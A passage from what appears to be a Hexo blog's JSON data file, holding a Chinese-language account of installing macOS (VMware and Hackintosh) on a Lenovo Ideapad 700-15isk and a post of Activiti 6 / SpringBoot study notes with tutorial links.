class=\"comment\"># 重启finder</span></span><br><span class=\"line\">killall Finder</span><br></pre></td></tr></table></figure></li>\n</ul>"},{"title":"黑苹果踩坑记录","date":"2021-05-29T04:00:00.000Z","_content":"\n# 前言\n\n> 等啊等，等啊等，mbp14 啥时候出啊。\n\nManjaro 用得虽然挺不错的，但是腾讯大流氓一直没有推出可用的 Linux 软件，而且我想做一下微信小程序的测试，又不想再在 Windows 上折腾安装环境，我又等着买 mbp，于是想直接体验 macOS 开发了\n\n<!--more-->\n\n# 虚拟机\n\n先想到的是 VMware 虚拟机，上网一搜，有了。\n\n[全网最详细的 VMware 虚拟机安装 MacOS 系统教程，没有之一！！！附全部资源](https://zhuanlan.zhihu.com/p/337036027)\n\n教程有了，资源都附带了，那就吭哧吭哧开干。\n\n- 首先使用 Unlocker 解锁 VMware，这样才能建立 macOS 虚拟机\n- 在 VMware 中新建 macOS 虚拟机，网络连接选择【NAT】，IO 控制器选择【LSI LOGIC】，硬盘选【SATA】，一路向下完成，先不要启动，然后打开`.vmx`文件，在最后添加代码`smc.version = 0`，保存\n- 启动虚拟机，走安装流程，格式化磁盘为【Mac OS 扩展（日志式）】，方案【GUID 分区图】，格式化后安装系统\n- 完成，顺便安装 VMware Tools，重启\n\n这样就有了一台 macOS 虚拟机了，体验了一下，显存只有 128MB，有点卡顿，也不能使用 Facetime、IMessage 之类的，真的只是看个样子，体验一下。\n\n# 黑苹果\n\n于是我开始谋求在自己电脑上安装黑苹果，折腾下来最重要的结论是一定要选择好自己电脑可用的 EFI 与对应的 macOS 版本。\n\n先说成功的经验吧，我用的笔记本是 Lenovo Ideapad 700-15isk，从大学陪伴我至今（大学时不折腾，工作后疯狂折腾装系统，我的脑子绝对有问题）。\n\n[联想 ideapad700-15isk（小新线下版）黑苹果完美驱动附详细安装过程](https://blog.csdn.net/a1353889150/article/details/97372378)\n\n## 准备\n\n- 下载好镜像，这里是[14.3 镜像](https://blog.daliansky.net/macOS-Mojave-10.14.3-18D42-official-version-with-Clover-4859-original-image.html)，黑果小兵提供\n- 下载好本机适配的 clover，教程作者改好的[Clover](https://pan.baidu.com/s/1om-eWSGpNwpnnBfeoV-sWg)\n- 下载安装盘制作工具[blenaEtcher](https://www.balena.io/etcher/)\n- 下载磁盘管理工具[DiskGenius](https://pan.baidu.com/s/1zeM2IW6jHezp_SYk7BhWyw)\n- 下载启动项管理工具[EasyUEFI](https://pan.baidu.com/s/1wOrtNPN3IZYhGJ1Q59H2SA)\n- BIOS 屏蔽独显，安装好后再打开；关闭安全启动，将 USB 启动移至最前方\n- 电脑划一份空间用于安装，我自己使用的是原先安装 Windows 的一整块 NVME 硬盘（没错，我在试错过程中搞崩了自己的系统，然后重装 Win10 到买来时的机械磁盘中，这个固态硬盘本来是大学时为了提高启动速度买的，本来装了 Windows 在上面，现在又只能委屈 Windows 了）\n\n## 安装\n\n- 使用 blenaEtcher 将镜像烧录进 U 盘\n- 重启电脑，跑代码，在 clover 界面选择 USB 启动，名称为 Boot macOS install from（后面是镜像名称）\n- 代码跑完后就是苹果图标，等进度条走完\n- 先选择语言，然后点击磁盘工具，选择抹掉准备安装的硬盘，设置名称，格式的话，固态选择【APFS】，机械选择【Mac OS 扩展（日志式）】，方案【GUID 分区图】，格式完成关闭磁盘工具\n- 选择安装 macOS，一直同意，安装盘选择格式化的那个硬盘。接下来它会先把需要的安装文件复制到分区里，之后会进行重启\n- 重启时不要拔出 U 盘，选择 Boot macOS from（安装磁盘名称），继续安装，前面一次只是将文件复制进硬盘，这一次才是安装系统\n- 安装完成重启，可拔出 U 盘\n- 重启先不要进 macOS，进入 Windows，打开 DiskGenius，选择安装磁盘的 EFI 分区，将里面的 Clover 删除，CrtlV 替换成适配自己电脑的 Clover\n- 再重启电脑，选择 Boot macOS from（安装磁盘名称），进入设置，个性化设置完成后就可享用 macOS 了\n\n注：\n\n- 安装 macOS 时出现应用程序副本已损坏错误，点菜单栏-实用工具-打开终端，输入：date 032208102015.20，退出终端，继续正常点安装 macOS。\n- 如果是安装的 15.6 的话 先替换 clover 文件再安装，但我没成功\n\n## 吐槽\n\n一开始我想安装 10.15 Catalina，因为虚拟机安装的也是这个版本。\n\n[联想小新 700-15ISK i5-6300HQ 黑苹果 Catalina – 苹果地带 (macx.top)](https://macx.top/3799.html)\n\n这个 EFI 暂且不表，我前面下载的用于虚拟机的 macOS 镜像没有分区表，写入 U 盘无法启动，于是我重新下载了 10.15.7 的镜像，一直卡在苹果图标，于是我换成 10.15.6 版本再试一次，结果代码跑一半不动了，真是吐血，换了好几个 EFI 都不行，我都想直接给钱找人帮忙装了。\n\n[联想 IdeaPad 700-15ISK win10 黑苹果双系统教程 子墨的博客 (zimo.wiki)](https://blog.zimo.wiki/posts/ad76eda8/)\n\n> 这个人的博客就是我想要的博客网站，不知道他怎么搭的，想要。\n\n最后选择最开始说的 10.14.3 Mojave，一次成功，设置完成后刚好母上打了 Facetime 过来，直接在电脑上接听了，一切安好。\n\n后记：我又想整点花活，直接在电脑上下载 Catalina 的更新包，重启的时候进 Windows 替换 EFI，结果当然是失败，提供的 15.6Clover 直接一个大大的禁止符号，气死我了，无奈重装。\n\n心疼我下载用的 n 多流量 T-T。\n","source":"_posts/2021/05/黑苹果踩坑记录.md","raw":"---\ntitle: 黑苹果踩坑记录\ndate: 2021-05-29 12:00:00\ntags:\n  - DIY\ncategories:\n  - DIY\n  - 软件\n---\n\n# 前言\n\n> 等啊等，等啊等，mbp14 啥时候出啊。\n\nManjaro 用得虽然挺不错的，但是腾讯大流氓一直没有推出可用的 Linux 软件，而且我想做一下微信小程序的测试，又不想再在 Windows 上折腾安装环境，我又等着买 mbp，于是想直接体验 macOS 开发了\n\n<!--more-->\n\n# 虚拟机\n\n先想到的是 VMware 虚拟机，上网一搜，有了。\n\n[全网最详细的 VMware 虚拟机安装 MacOS 系统教程，没有之一！！！附全部资源](https://zhuanlan.zhihu.com/p/337036027)\n\n教程有了，资源都附带了，那就吭哧吭哧开干。\n\n- 首先使用 Unlocker 解锁 VMware，这样才能建立 macOS 虚拟机\n- 在 VMware 中新建 macOS 虚拟机，网络连接选择【NAT】，IO 控制器选择【LSI LOGIC】，硬盘选【SATA】，一路向下完成，先不要启动，然后打开`.vmx`文件，在最后添加代码`smc.version = 0`，保存\n- 启动虚拟机，走安装流程，格式化磁盘为【Mac OS 扩展（日志式）】，方案【GUID 分区图】，格式化后安装系统\n- 完成，顺便安装 VMware Tools，重启\n\n这样就有了一台 macOS 虚拟机了，体验了一下，显存只有 128MB，有点卡顿，也不能使用 Facetime、IMessage 之类的，真的只是看个样子，体验一下。\n\n# 黑苹果\n\n于是我开始谋求在自己电脑上安装黑苹果，折腾下来最重要的结论是一定要选择好自己电脑可用的 EFI 与对应的 macOS 版本。\n\n先说成功的经验吧，我用的笔记本是 Lenovo Ideapad 700-15isk，从大学陪伴我至今（大学时不折腾，工作后疯狂折腾装系统，我的脑子绝对有问题）。\n\n[联想 ideapad700-15isk（小新线下版）黑苹果完美驱动附详细安装过程](https://blog.csdn.net/a1353889150/article/details/97372378)\n\n## 准备\n\n- 下载好镜像，这里是[14.3 镜像](https://blog.daliansky.net/macOS-Mojave-10.14.3-18D42-official-version-with-Clover-4859-original-image.html)，黑果小兵提供\n- 下载好本机适配的 clover，教程作者改好的[Clover](https://pan.baidu.com/s/1om-eWSGpNwpnnBfeoV-sWg)\n- 下载安装盘制作工具[blenaEtcher](https://www.balena.io/etcher/)\n- 下载磁盘管理工具[DiskGenius](https://pan.baidu.com/s/1zeM2IW6jHezp_SYk7BhWyw)\n- 下载启动项管理工具[EasyUEFI](https://pan.baidu.com/s/1wOrtNPN3IZYhGJ1Q59H2SA)\n- BIOS 屏蔽独显，安装好后再打开；关闭安全启动，将 USB 启动移至最前方\n- 电脑划一份空间用于安装，我自己使用的是原先安装 Windows 的一整块 NVME 硬盘（没错，我在试错过程中搞崩了自己的系统，然后重装 Win10 到买来时的机械磁盘中，这个固态硬盘本来是大学时为了提高启动速度买的，本来装了 Windows 在上面，现在又只能委屈 Windows 了）\n\n## 安装\n\n- 使用 blenaEtcher 将镜像烧录进 U 盘\n- 重启电脑，跑代码，在 clover 界面选择 USB 启动，名称为 Boot macOS install from（后面是镜像名称）\n- 代码跑完后就是苹果图标，等进度条走完\n- 先选择语言，然后点击磁盘工具，选择抹掉准备安装的硬盘，设置名称，格式的话，固态选择【APFS】，机械选择【Mac OS 扩展（日志式）】，方案【GUID 分区图】，格式完成关闭磁盘工具\n- 选择安装 macOS，一直同意，安装盘选择格式化的那个硬盘。接下来它会先把需要的安装文件复制到分区里，之后会进行重启\n- 重启时不要拔出 U 盘，选择 Boot macOS from（安装磁盘名称），继续安装，前面一次只是将文件复制进硬盘，这一次才是安装系统\n- 安装完成重启，可拔出 U 盘\n- 重启先不要进 macOS，进入 Windows，打开 DiskGenius，选择安装磁盘的 EFI 分区，将里面的 Clover 删除，CrtlV 替换成适配自己电脑的 Clover\n- 再重启电脑，选择 Boot macOS from（安装磁盘名称），进入设置，个性化设置完成后就可享用 macOS 了\n\n注：\n\n- 安装 macOS 时出现应用程序副本已损坏错误，点菜单栏-实用工具-打开终端，输入：date 032208102015.20，退出终端，继续正常点安装 macOS。\n- 如果是安装的 15.6 的话 先替换 clover 文件再安装，但我没成功\n\n## 吐槽\n\n一开始我想安装 10.15 Catalina，因为虚拟机安装的也是这个版本。\n\n[联想小新 700-15ISK i5-6300HQ 黑苹果 Catalina – 苹果地带 (macx.top)](https://macx.top/3799.html)\n\n这个 EFI 暂且不表，我前面下载的用于虚拟机的 macOS 镜像没有分区表，写入 U 盘无法启动，于是我重新下载了 10.15.7 的镜像，一直卡在苹果图标，于是我换成 10.15.6 版本再试一次，结果代码跑一半不动了，真是吐血，换了好几个 EFI 都不行，我都想直接给钱找人帮忙装了。\n\n[联想 IdeaPad 700-15ISK win10 黑苹果双系统教程 子墨的博客 (zimo.wiki)](https://blog.zimo.wiki/posts/ad76eda8/)\n\n> 这个人的博客就是我想要的博客网站，不知道他怎么搭的，想要。\n\n最后选择最开始说的 10.14.3 Mojave，一次成功，设置完成后刚好母上打了 Facetime 过来，直接在电脑上接听了，一切安好。\n\n后记：我又想整点花活，直接在电脑上下载 Catalina 的更新包，重启的时候进 Windows 替换 EFI，结果当然是失败，提供的 15.6Clover 直接一个大大的禁止符号，气死我了，无奈重装。\n\n心疼我下载用的 n 多流量 T-T。\n","slug":"2021/05/黑苹果踩坑记录","published":1,"updated":"2022-07-23T14:41:42.290Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xciy0007zge36ryxdkrg","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><blockquote>\n<p>等啊等，等啊等，mbp14 啥时候出啊。</p>\n</blockquote>\n<p>Manjaro 用得虽然挺不错的，但是腾讯大流氓一直没有推出可用的 Linux 软件，而且我想做一下微信小程序的测试，又不想再在 Windows 上折腾安装环境，我又等着买 mbp，于是想直接体验 macOS 开发了</p>\n<span id=\"more\"></span>\n\n<h1 id=\"虚拟机\"><a href=\"#虚拟机\" class=\"headerlink\" title=\"虚拟机\"></a>虚拟机</h1><p>先想到的是 VMware 虚拟机，上网一搜，有了。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/337036027\">全网最详细的 VMware 虚拟机安装 MacOS 系统教程，没有之一！！！附全部资源</a></p>\n<p>教程有了，资源都附带了，那就吭哧吭哧开干。</p>\n<ul>\n<li>首先使用 Unlocker 解锁 VMware，这样才能建立 macOS 虚拟机</li>\n<li>在 VMware 中新建 macOS 虚拟机，网络连接选择【NAT】，IO 控制器选择【LSI LOGIC】，硬盘选【SATA】，一路向下完成，先不要启动，然后打开<code>.vmx</code>文件，在最后添加代码<code>smc.version = 0</code>，保存</li>\n<li>启动虚拟机，走安装流程，格式化磁盘为【Mac OS 扩展（日志式）】，方案【GUID 分区图】，格式化后安装系统</li>\n<li>完成，顺便安装 VMware Tools，重启</li>\n</ul>\n<p>这样就有了一台 macOS 虚拟机了，体验了一下，显存只有 128MB，有点卡顿，也不能使用 Facetime、IMessage 之类的，真的只是看个样子，体验一下。</p>\n<h1 id=\"黑苹果\"><a href=\"#黑苹果\" class=\"headerlink\" title=\"黑苹果\"></a>黑苹果</h1><p>于是我开始谋求在自己电脑上安装黑苹果，折腾下来最重要的结论是一定要选择好自己电脑可用的 EFI 与对应的 macOS 版本。</p>\n<p>先说成功的经验吧，我用的笔记本是 Lenovo Ideapad 700-15isk，从大学陪伴我至今（大学时不折腾，工作后疯狂折腾装系统，我的脑子绝对有问题）。</p>\n<p><a href=\"https://blog.csdn.net/a1353889150/article/details/97372378\">联想 ideapad700-15isk（小新线下版）黑苹果完美驱动附详细安装过程</a></p>\n<h2 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h2><ul>\n<li>下载好镜像，这里是<a href=\"https://blog.daliansky.net/macOS-Mojave-10.14.3-18D42-official-version-with-Clover-4859-original-image.html\">14.3 镜像</a>，黑果小兵提供</li>\n<li>下载好本机适配的 clover，教程作者改好的<a href=\"https://pan.baidu.com/s/1om-eWSGpNwpnnBfeoV-sWg\">Clover</a></li>\n<li>下载安装盘制作工具<a href=\"https://www.balena.io/etcher/\">blenaEtcher</a></li>\n<li>下载磁盘管理工具<a href=\"https://pan.baidu.com/s/1zeM2IW6jHezp_SYk7BhWyw\">DiskGenius</a></li>\n<li>下载启动项管理工具<a href=\"https://pan.baidu.com/s/1wOrtNPN3IZYhGJ1Q59H2SA\">EasyUEFI</a></li>\n<li>BIOS 屏蔽独显，安装好后再打开；关闭安全启动，将 USB 启动移至最前方</li>\n<li>电脑划一份空间用于安装，我自己使用的是原先安装 Windows 的一整块 NVME 硬盘（没错，我在试错过程中搞崩了自己的系统，然后重装 Win10 到买来时的机械磁盘中，这个固态硬盘本来是大学时为了提高启动速度买的，本来装了 Windows 在上面，现在又只能委屈 Windows 了）</li>\n</ul>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><ul>\n<li>使用 blenaEtcher 将镜像烧录进 U 盘</li>\n<li>重启电脑，跑代码，在 clover 界面选择 USB 启动，名称为 Boot macOS install from（后面是镜像名称）</li>\n<li>代码跑完后就是苹果图标，等进度条走完</li>\n<li>先选择语言，然后点击磁盘工具，选择抹掉准备安装的硬盘，设置名称，格式的话，固态选择【APFS】，机械选择【Mac OS 扩展（日志式）】，方案【GUID 分区图】，格式完成关闭磁盘工具</li>\n<li>选择安装 macOS，一直同意，安装盘选择格式化的那个硬盘。接下来它会先把需要的安装文件复制到分区里，之后会进行重启</li>\n<li>重启时不要拔出 U 盘，选择 Boot macOS from（安装磁盘名称），继续安装，前面一次只是将文件复制进硬盘，这一次才是安装系统</li>\n<li>安装完成重启，可拔出 U 盘</li>\n<li>重启先不要进 macOS，进入 Windows，打开 DiskGenius，选择安装磁盘的 EFI 分区，将里面的 Clover 删除，CrtlV 替换成适配自己电脑的 Clover</li>\n<li>再重启电脑，选择 Boot macOS from（安装磁盘名称），进入设置，个性化设置完成后就可享用 macOS 了</li>\n</ul>\n<p>注：</p>\n<ul>\n<li>安装 macOS 时出现应用程序副本已损坏错误，点菜单栏-实用工具-打开终端，输入：date 032208102015.20，退出终端，继续正常点安装 macOS。</li>\n<li>如果是安装的 15.6 的话 先替换 clover 文件再安装，但我没成功</li>\n</ul>\n<h2 id=\"吐槽\"><a href=\"#吐槽\" class=\"headerlink\" title=\"吐槽\"></a>吐槽</h2><p>一开始我想安装 10.15 Catalina，因为虚拟机安装的也是这个版本。</p>\n<p><a href=\"https://macx.top/3799.html\">联想小新 700-15ISK i5-6300HQ 黑苹果 Catalina – 苹果地带 (macx.top)</a></p>\n<p>这个 EFI 暂且不表，我前面下载的用于虚拟机的 macOS 镜像没有分区表，写入 U 盘无法启动，于是我重新下载了 10.15.7 的镜像，一直卡在苹果图标，于是我换成 10.15.6 版本再试一次，结果代码跑一半不动了，真是吐血，换了好几个 EFI 都不行，我都想直接给钱找人帮忙装了。</p>\n<p><a href=\"https://blog.zimo.wiki/posts/ad76eda8/\">联想 IdeaPad 700-15ISK win10 黑苹果双系统教程 子墨的博客 (zimo.wiki)</a></p>\n<blockquote>\n<p>这个人的博客就是我想要的博客网站，不知道他怎么搭的，想要。</p>\n</blockquote>\n<p>最后选择最开始说的 10.14.3 Mojave，一次成功，设置完成后刚好母上打了 Facetime 过来，直接在电脑上接听了，一切安好。</p>\n<p>后记：我又想整点花活，直接在电脑上下载 Catalina 的更新包，重启的时候进 Windows 替换 EFI，结果当然是失败，提供的 15.6Clover 直接一个大大的禁止符号，气死我了，无奈重装。</p>\n<p>心疼我下载用的 n 多流量 T-T。</p>\n","site":{"data":{}},"excerpt":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><blockquote>\n<p>等啊等，等啊等，mbp14 啥时候出啊。</p>\n</blockquote>\n<p>Manjaro 用得虽然挺不错的，但是腾讯大流氓一直没有推出可用的 Linux 软件，而且我想做一下微信小程序的测试，又不想再在 Windows 上折腾安装环境，我又等着买 mbp，于是想直接体验 macOS 开发了</p>","more":"<h1 id=\"虚拟机\"><a href=\"#虚拟机\" class=\"headerlink\" title=\"虚拟机\"></a>虚拟机</h1><p>先想到的是 VMware 虚拟机，上网一搜，有了。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/337036027\">全网最详细的 VMware 虚拟机安装 MacOS 系统教程，没有之一！！！附全部资源</a></p>\n<p>教程有了，资源都附带了，那就吭哧吭哧开干。</p>\n<ul>\n<li>首先使用 Unlocker 解锁 VMware，这样才能建立 macOS 虚拟机</li>\n<li>在 VMware 中新建 macOS 虚拟机，网络连接选择【NAT】，IO 控制器选择【LSI LOGIC】，硬盘选【SATA】，一路向下完成，先不要启动，然后打开<code>.vmx</code>文件，在最后添加代码<code>smc.version = 0</code>，保存</li>\n<li>启动虚拟机，走安装流程，格式化磁盘为【Mac OS 扩展（日志式）】，方案【GUID 分区图】，格式化后安装系统</li>\n<li>完成，顺便安装 VMware Tools，重启</li>\n</ul>\n<p>这样就有了一台 macOS 虚拟机了，体验了一下，显存只有 128MB，有点卡顿，也不能使用 Facetime、IMessage 之类的，真的只是看个样子，体验一下。</p>\n<h1 id=\"黑苹果\"><a href=\"#黑苹果\" class=\"headerlink\" title=\"黑苹果\"></a>黑苹果</h1><p>于是我开始谋求在自己电脑上安装黑苹果，折腾下来最重要的结论是一定要选择好自己电脑可用的 EFI 与对应的 macOS 版本。</p>\n<p>先说成功的经验吧，我用的笔记本是 Lenovo Ideapad 700-15isk，从大学陪伴我至今（大学时不折腾，工作后疯狂折腾装系统，我的脑子绝对有问题）。</p>\n<p><a href=\"https://blog.csdn.net/a1353889150/article/details/97372378\">联想 ideapad700-15isk（小新线下版）黑苹果完美驱动附详细安装过程</a></p>\n<h2 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h2><ul>\n<li>下载好镜像，这里是<a href=\"https://blog.daliansky.net/macOS-Mojave-10.14.3-18D42-official-version-with-Clover-4859-original-image.html\">14.3 镜像</a>，黑果小兵提供</li>\n<li>下载好本机适配的 clover，教程作者改好的<a href=\"https://pan.baidu.com/s/1om-eWSGpNwpnnBfeoV-sWg\">Clover</a></li>\n<li>下载安装盘制作工具<a href=\"https://www.balena.io/etcher/\">blenaEtcher</a></li>\n<li>下载磁盘管理工具<a href=\"https://pan.baidu.com/s/1zeM2IW6jHezp_SYk7BhWyw\">DiskGenius</a></li>\n<li>下载启动项管理工具<a href=\"https://pan.baidu.com/s/1wOrtNPN3IZYhGJ1Q59H2SA\">EasyUEFI</a></li>\n<li>BIOS 屏蔽独显，安装好后再打开；关闭安全启动，将 USB 启动移至最前方</li>\n<li>电脑划一份空间用于安装，我自己使用的是原先安装 Windows 的一整块 NVME 硬盘（没错，我在试错过程中搞崩了自己的系统，然后重装 Win10 到买来时的机械磁盘中，这个固态硬盘本来是大学时为了提高启动速度买的，本来装了 Windows 在上面，现在又只能委屈 Windows 了）</li>\n</ul>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><ul>\n<li>使用 blenaEtcher 将镜像烧录进 U 盘</li>\n<li>重启电脑，跑代码，在 clover 界面选择 USB 启动，名称为 Boot macOS install from（后面是镜像名称）</li>\n<li>代码跑完后就是苹果图标，等进度条走完</li>\n<li>先选择语言，然后点击磁盘工具，选择抹掉准备安装的硬盘，设置名称，格式的话，固态选择【APFS】，机械选择【Mac OS 扩展（日志式）】，方案【GUID 分区图】，格式完成关闭磁盘工具</li>\n<li>选择安装 macOS，一直同意，安装盘选择格式化的那个硬盘。接下来它会先把需要的安装文件复制到分区里，之后会进行重启</li>\n<li>重启时不要拔出 U 盘，选择 Boot macOS from（安装磁盘名称），继续安装，前面一次只是将文件复制进硬盘，这一次才是安装系统</li>\n<li>安装完成重启，可拔出 U 盘</li>\n<li>重启先不要进 macOS，进入 Windows，打开 DiskGenius，选择安装磁盘的 EFI 分区，将里面的 Clover 删除，CrtlV 替换成适配自己电脑的 Clover</li>\n<li>再重启电脑，选择 Boot macOS from（安装磁盘名称），进入设置，个性化设置完成后就可享用 macOS 了</li>\n</ul>\n<p>注：</p>\n<ul>\n<li>安装 macOS 时出现应用程序副本已损坏错误，点菜单栏-实用工具-打开终端，输入：date 032208102015.20，退出终端，继续正常点安装 macOS。</li>\n<li>如果是安装的 15.6 的话 先替换 clover 文件再安装，但我没成功</li>\n</ul>\n<h2 id=\"吐槽\"><a href=\"#吐槽\" class=\"headerlink\" title=\"吐槽\"></a>吐槽</h2><p>一开始我想安装 10.15 Catalina，因为虚拟机安装的也是这个版本。</p>\n<p><a href=\"https://macx.top/3799.html\">联想小新 700-15ISK i5-6300HQ 黑苹果 Catalina – 苹果地带 (macx.top)</a></p>\n<p>这个 EFI 暂且不表，我前面下载的用于虚拟机的 macOS 镜像没有分区表，写入 U 盘无法启动，于是我重新下载了 10.15.7 的镜像，一直卡在苹果图标，于是我换成 10.15.6 版本再试一次，结果代码跑一半不动了，真是吐血，换了好几个 EFI 都不行，我都想直接给钱找人帮忙装了。</p>\n<p><a href=\"https://blog.zimo.wiki/posts/ad76eda8/\">联想 IdeaPad 700-15ISK win10 黑苹果双系统教程 子墨的博客 (zimo.wiki)</a></p>\n<blockquote>\n<p>这个人的博客就是我想要的博客网站，不知道他怎么搭的，想要。</p>\n</blockquote>\n<p>最后选择最开始说的 10.14.3 Mojave，一次成功，设置完成后刚好母上打了 Facetime 过来，直接在电脑上接听了，一切安好。</p>\n<p>后记：我又想整点花活，直接在电脑上下载 Catalina 的更新包，重启的时候进 Windows 替换 EFI，结果当然是失败，提供的 15.6Clover 直接一个大大的禁止符号，气死我了，无奈重装。</p>\n<p>心疼我下载用的 n 多流量 T-T。</p>"},{"title":"Activiti学习记录","date":"2020-10-26T01:00:00.000Z","_content":"\n# Activiti 官方网站\n\n先上官方文档，[Activiti 6 User Guide](https://www.activiti.org/userguide)\n\n<!--more-->\n\n# 找到的教程系列文章\n\n- [SpringBoot Activiti6 系列教程(一)-activiti-app 部署](https://zhengjianfeng.cn/?p=162)\n- [SpringBoot Activiti6 系列教程(二)-基于 mysql 数据库初始化](https://zhengjianfeng.cn/?p=167)\n- [SpringBoot Activiti6 系列教程(三)-开发一个简单的 SpringBoot activiti6 应用程序](https://zhengjianfeng.cn/?p=170)\n- [SpringBoot Activiti6 系列教程(四)-流程部署](https://zhengjianfeng.cn/?p=176)\n- [SpringBoot Activiti6 系列教程(五)-activiti api](https://zhengjianfeng.cn/?p=179)\n- [SpringBoot Activiti6 系列教程(六)-Execution 说明](https://zhengjianfeng.cn/?p=184)\n- [SpringBoot Activiti6 系列教程(七)-变量](https://zhengjianfeng.cn/?p=186)\n- [SpringBoot Activiti6 系列教程(八)-流程拒绝实现](https://zhengjianfeng.cn/?p=190)\n- [SpringBoot Activiti6 系列教程(九)-流程回退实现](https://zhengjianfeng.cn/?p=193)\n- [SpringBoot Activiti6 系列教程(十)-流程加签征询实现(完结篇)](https://zhengjianfeng.cn/?p=197)\n\n# 架构说明\n\n> ProcessEngineConfiguration 类，主要作用是加载 activiti.cfg.xml 配置文件；\n\n> ProcessEngine 类，可以生成 activiti 的工作环境（建表），通过此类得到各个 Service 的接口；\n\n> Service 接口，快速实现数据库表的操作；\n>\n> ​ |---- RepositoryService\n>\n> ​ |---- RuntimeService\n>\n> ​ |---- TaskService 查看、处理任务\n>\n> ​ |---- HistoryService\n>\n> [Activiti 核心 API 介绍](https://my.oschina.net/fuyung/blog/475181)\n\n# 流程\n\n> 流程部署\n> 1、单个文件部署（bpmn 文件，png 文件），addClasspathResource(\"\\*.bpmn\")\n>\n> ​ 2、将 bpmn 文件与 png 文件压缩成 zip 文件，再通过 addZipInputStream()部署\n\n> 流程实例\n>\n> 一个流程定义可以对应多个流程实例\n> 启动流程实例 RuntimeService startProcessInstanceByKey(\"key\")\n\n## 实例\n\n> [组任务流程 CandidateUsers](https://blog.csdn.net/qq_15204179/article/details/86298442)\n\n> [分配组任务的三种方式](https://blog.csdn.net/zjx86320/article/details/50412263)\n\n> [查询待办和已办任务](https://blog.csdn.net/ylforever/article/details/99708257)\n\n> [Activiti 业务键（businessKey）](https://www.cnblogs.com/cxyj/p/3893631.html)\n","source":"_posts/2020/10/Activiti学习记录.md","raw":"---\ntitle: Activiti学习记录\ndate: 2020-10-26 09:00:00\ntags:\n  - Java\n  - SpringBoot\ncategories:\n  - Java\n  - SpringBoot\n---\n\n# Activiti 官方网站\n\n先上官方文档，[Activiti 6 User Guide](https://www.activiti.org/userguide)\n\n<!--more-->\n\n# 找到的教程系列文章\n\n- [SpringBoot Activiti6 系列教程(一)-activiti-app 部署](https://zhengjianfeng.cn/?p=162)\n- [SpringBoot Activiti6 系列教程(二)-基于 mysql 数据库初始化](https://zhengjianfeng.cn/?p=167)\n- [SpringBoot Activiti6 系列教程(三)-开发一个简单的 SpringBoot activiti6 应用程序](https://zhengjianfeng.cn/?p=170)\n- [SpringBoot Activiti6 系列教程(四)-流程部署](https://zhengjianfeng.cn/?p=176)\n- [SpringBoot Activiti6 系列教程(五)-activiti api](https://zhengjianfeng.cn/?p=179)\n- [SpringBoot Activiti6 系列教程(六)-Execution 说明](https://zhengjianfeng.cn/?p=184)\n- [SpringBoot Activiti6 系列教程(七)-变量](https://zhengjianfeng.cn/?p=186)\n- [SpringBoot Activiti6 系列教程(八)-流程拒绝实现](https://zhengjianfeng.cn/?p=190)\n- [SpringBoot Activiti6 系列教程(九)-流程回退实现](https://zhengjianfeng.cn/?p=193)\n- [SpringBoot Activiti6 系列教程(十)-流程加签征询实现(完结篇)](https://zhengjianfeng.cn/?p=197)\n\n# 架构说明\n\n> ProcessEngineConfiguration 类，主要作用是加载 activiti.cfg.xml 配置文件；\n\n> ProcessEngine 类，可以生成 activiti 的工作环境（建表），通过此类得到各个 Service 的接口；\n\n> Service 接口，快速实现数据库表的操作；\n>\n> ​ |---- RepositoryService\n>\n> ​ |---- RuntimeService\n>\n> ​ |---- TaskService 查看、处理任务\n>\n> ​ |---- HistoryService\n>\n> [Activiti 核心 API 介绍](https://my.oschina.net/fuyung/blog/475181)\n\n# 流程\n\n> 流程部署\n> 1、单个文件部署（bpmn 文件，png 文件），addClasspathResource(\"\\*.bpmn\")\n>\n> ​ 2、将 bpmn 文件与 png 文件压缩成 zip 文件，再通过 addZipInputStream()部署\n\n> 流程实例\n>\n> 一个流程定义可以对应多个流程实例\n> 启动流程实例 RuntimeService startProcessInstanceByKey(\"key\")\n\n## 实例\n\n> [组任务流程 CandidateUsers](https://blog.csdn.net/qq_15204179/article/details/86298442)\n\n> [分配组任务的三种方式](https://blog.csdn.net/zjx86320/article/details/50412263)\n\n> [查询待办和已办任务](https://blog.csdn.net/ylforever/article/details/99708257)\n\n> [Activiti 业务键（businessKey）](https://www.cnblogs.com/cxyj/p/3893631.html)\n","slug":"2020/10/Activiti学习记录","published":1,"updated":"2022-09-26T15:05:17.221Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clyh3xciy0008zge351uwg56i","content":"<h1 id=\"Activiti-官方网站\"><a href=\"#Activiti-官方网站\" class=\"headerlink\" title=\"Activiti 官方网站\"></a>Activiti 官方网站</h1><p>先上官方文档，<a href=\"https://www.activiti.org/userguide\">Activiti 6 User Guide</a></p>\n<span id=\"more\"></span>\n\n<h1 id=\"找到的教程系列文章\"><a href=\"#找到的教程系列文章\" class=\"headerlink\" title=\"找到的教程系列文章\"></a>找到的教程系列文章</h1><ul>\n<li><a href=\"https://zhengjianfeng.cn/?p=162\">SpringBoot Activiti6 系列教程(一)-activiti-app 部署</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=167\">SpringBoot Activiti6 系列教程(二)-基于 mysql 数据库初始化</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=170\">SpringBoot Activiti6 系列教程(三)-开发一个简单的 SpringBoot activiti6 应用程序</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=176\">SpringBoot Activiti6 系列教程(四)-流程部署</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=179\">SpringBoot Activiti6 系列教程(五)-activiti api</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=184\">SpringBoot Activiti6 系列教程(六)-Execution 说明</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=186\">SpringBoot Activiti6 系列教程(七)-变量</a></li>\n<li><a href=\"https://zhengjianfeng.cn/?p=190\">SpringBoot Activiti6 系列教程(八)-流程拒绝实现</a></li>\n<li><a 